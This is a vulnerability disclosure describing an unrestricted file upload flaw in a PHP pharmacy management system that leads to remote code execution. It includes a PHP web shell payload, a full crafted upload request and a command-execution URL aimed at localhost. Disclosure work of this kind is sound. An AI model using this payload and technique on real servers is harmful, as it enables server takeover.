Description

A vulnerability was found in SourceCodester Web-based Pharmacy Product Management System 1.0 and has been classified as critical. This issue exists in the product_expiry/add-product.php file and is caused by unrestricted file upload functionality. The application fails to properly validate the uploaded file's name, extension, and MIME type, allowing attackers to upload a malicious PHP file disguised as an image (e.g., .php file with image/jpeg MIME type). The uploaded file is placed in a publicly accessible directory (uploadImage/), which can then be accessed via a web browser to execute arbitrary commands on the server. This leads to remote code execution (RCE). Exploitation requires network access and authentication (if the upload form is protected), but can result in complete system compromise. Affected version: 1.0.

User can be added under the add-product.php route

![image](https://github.com/user-attachments/assets/b1e7d8c8-10c0-4e5c-b3ce-640b2065ccd5)



Affect code

Locate L27-L52 of add-product.php source code

![image](https://github.com/user-attachments/assets/848c21e4-9341-48db-b51e-864fed69e178)

Prepare payload (shell.php):

<?php system($_GET['cmd']); ?>

Rename the file to bypass client-side validation:

![add-product3](https://github.com/user-attachments/assets/199ee5f6-c6d2-4933-9313-05b27a31eaf5)

Upload the file 

![add-product4](https://github.com/user-attachments/assets/2397e8fc-3616-41ba-ad24-2cab24529244)

Intercept and modify upload  in Burp Suite:

Request:

POST /product_expiry/add-product.php HTTP/1.1

Host: localhost

Content-Length: 818

Cache-Control: max-age=0

sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"

sec-ch-ua-mobile: ?0

sec-ch-ua-platform: "Linux"

Upgrade-Insecure-Requests: 1

Origin: http://localhost

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryL9hOhT5TGmZHHMKF

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: http://localhost/product_expiry/add-product.php

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: PHPSESSID=k4708v59avndassvj5te41ha1u

Connection: close



------WebKitFormBoundaryL9hOhT5TGmZHHMKF

Content-Disposition: form-data; name="txtproduct_name"



test3

------WebKitFormBoundaryL9hOhT5TGmZHHMKF

Content-Disposition: form-data; name="cmdcategory"





------WebKitFormBoundaryL9hOhT5TGmZHHMKF

Content-Disposition: form-data; name="txtexpirydate"



2025-04-02

------WebKitFormBoundaryL9hOhT5TGmZHHMKF

Content-Disposition: form-data; name="txtqty"



100

------WebKitFormBoundaryL9hOhT5TGmZHHMKF

Content-Disposition: form-data; name="txtprice"



100

------WebKitFormBoundaryL9hOhT5TGmZHHMKF

Content-Disposition: form-data; name="avatar"; filename="shell.php"

Content-Type: image/png



<?php system($_GET['cmd']); ?>


------WebKitFormBoundaryL9hOhT5TGmZHHMKF

Content-Disposition: form-data; name="btnsave"





------WebKitFormBoundaryL9hOhT5TGmZHHMKF--

![add-product7](https://github.com/user-attachments/assets/b4cb4bd9-5b0e-4245-855c-3eb2a44afa11)


Access the shell:

http://localhost/product_expiry/uploadImage/shell.php?cmd=id


![add-product8](https://github.com/user-attachments/assets/6de008a2-ade4-4447-a597-8050b2a32257)


Reverse Shell using python:

![add-product9](https://github.com/user-attachments/assets/3c4e81e3-dbb9-4859-80fb-e437b6fa4afd)

![add-product10](https://github.com/user-attachments/assets/2e93a3fe-dbba-4036-a6a4-fb03124ccbb5)




